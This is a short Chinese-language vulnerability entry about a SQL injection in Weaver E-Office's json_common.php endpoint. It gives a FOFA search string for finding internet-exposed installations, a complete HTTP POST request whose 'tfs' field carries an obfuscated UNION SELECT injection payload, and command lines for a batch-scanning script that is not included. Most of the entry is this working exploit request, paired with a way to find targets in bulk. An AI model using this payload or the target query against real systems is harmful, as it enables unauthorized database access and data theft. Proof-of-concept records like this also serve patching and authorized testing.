# 泛微E-Office json_common.php SQL注入漏洞

### 1.漏洞描述

泛微为企业办公提供丰富应用，覆盖常见协作场景，开箱即用。满足人事、行政、财务、销售、运营、市场等不同部门协作需求，帮助组织高效管事理人。

系统 json_common.php 文件存在SQL注入漏洞

### 2.fofa语法

```
app="泛微-EOffice"
```

### 3.漏洞复现

```
POST /building/json_common.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36
Connection: close
Content-Length: 87
Accept: */*
Accept-Language: en
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

tfs=city` where cityId =-1 /*!50000union*/ /*!50000select*/1,2,md5(102103122) ,4#|2|333
```

![img](https://cdn.nlark.com/yuque/0/2024/png/42783549/1719831676177-e6783e1e-13aa-48b6-a8a4-7b8519d28c36.png)

### 4.py脚本使用

```
python3 脚本文件名 -u "http://127.0.0.1"  # 测试单个url
python3 脚本文件名 -f url.txt             # 测试多个url
```

